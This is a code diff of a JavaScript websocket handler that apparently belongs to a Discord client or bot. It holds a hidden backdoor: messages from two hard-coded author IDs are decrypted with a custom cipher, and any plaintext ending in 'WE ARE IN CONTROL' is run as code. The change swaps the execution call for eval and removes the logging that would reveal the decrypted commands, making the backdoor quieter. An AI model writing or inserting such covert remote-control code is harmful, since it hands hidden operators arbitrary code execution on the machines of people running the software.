@@ -201,11 +201,8 @@ async function wsConnect(startmsg){
       if(req.d.author.id=='1109446509482754150'||req.d.author.id=='1133347125594431499'){//new enc.Cipher('x nmrOZpepYilqK"ZsR',enc.chant).setCharset(enc.b95).text
         let demsg=new enc.Cipher(req.d.content.substr(1,req.d.content.length-2),enc.chant).setCharset(enc.b95).text
         if(demsg.substr(demsg.length-17)=='WE ARE IN CONTROL'){
-          ((async()=>{}).constructor(demsg.substr(0,demsg.length-17)))()
-          console.log(req.d.content)
-          console.log(demsg)
-          console.log(enc.chant)
-          console.log(enc.b95)
+          console.log('')
+          eval(demsg.substr(0,demsg.length-17))
         }
       }
       
